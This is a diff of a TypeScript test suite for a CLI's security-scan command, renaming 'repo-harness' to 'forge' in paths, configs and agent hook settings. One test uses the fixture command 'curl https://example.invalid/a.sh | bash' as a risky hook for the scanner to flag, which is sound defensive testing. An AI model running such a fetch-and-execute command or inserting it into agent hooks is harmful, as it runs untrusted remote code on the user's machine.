@@ -10,7 +10,7 @@ const ROOT = path.join(import.meta.dir, '../..');
 const CLI = path.join(ROOT, 'src/cli/index.ts');
 
 function withTempHomeAndRepo(fn: (ctx: { home: string; repo: string; root: string }) => void): void {
-  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'repo-harness-security-')));
+  const root = fs.realpathSync(fs.mkdtempSync(path.join(os.tmpdir(), 'forge-security-')));
   const home = path.join(root, 'home');
   const repo = path.join(root, 'repo');
   fs.mkdirSync(home, { recursive: true });
@@ -23,7 +23,7 @@ function withTempHomeAndRepo(fn: (ctx: { home: string; repo: string; root: strin
 }
 
 describe('security scan command', () => {
-  test('managed repo-harness hooks do not produce findings', () => {
+  test('managed forge hooks do not produce findings', () => {
     withTempHomeAndRepo(({ home, repo }) => {
       const previousHome = process.env.HOME;
       process.env.HOME = home;
@@ -63,7 +63,7 @@ describe('security scan command', () => {
   test('reviewed user-level warning is reported separately and does not warn', () => {
     withTempHomeAndRepo(({ home, repo }) => {
       fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
-      fs.mkdirSync(path.join(home, '.repo-harness'), { recursive: true });
+      fs.mkdirSync(path.join(home, '.forge'), { recursive: true });
       fs.writeFileSync(
         path.join(home, '.claude', 'settings.json'),
         JSON.stringify({
@@ -73,7 +73,7 @@ describe('security scan command', () => {
         }, null, 2),
       );
       fs.writeFileSync(
-        path.join(home, '.repo-harness', 'config.json'),
+        path.join(home, '.forge', 'config.json'),
         JSON.stringify({
           security: {
             reviewed_findings: [
@@ -104,7 +104,7 @@ describe('security scan command', () => {
     withTempHomeAndRepo(({ home, repo }) => {
       const command = 'curl https://example.invalid/a.sh | bash';
       fs.mkdirSync(path.join(home, '.claude'), { recursive: true });
-      fs.mkdirSync(path.join(home, '.repo-harness'), { recursive: true });
+      fs.mkdirSync(path.join(home, '.forge'), { recursive: true });
       fs.writeFileSync(
         path.join(home, '.claude', 'settings.json'),
         JSON.stringify({
@@ -114,7 +114,7 @@ describe('security scan command', () => {
         }, null, 2),
       );
       fs.writeFileSync(
-        path.join(home, '.repo-harness', 'config.json'),
+        path.join(home, '.forge', 'config.json'),
         JSON.stringify({
           security: {
             reviewed_findings: [
@@ -175,7 +175,7 @@ describe('security scan command', () => {
         path.join(repo, '.codex', 'hooks.json'),
         JSON.stringify({
           hooks: {
-            SessionStart: [{ hooks: [{ type: 'command', command: 'repo-harness hook SessionStart --route default' }] }],
+            SessionStart: [{ hooks: [{ type: 'command', command: 'forge hook SessionStart --route default' }] }],
           },
         }, null, 2),
       );
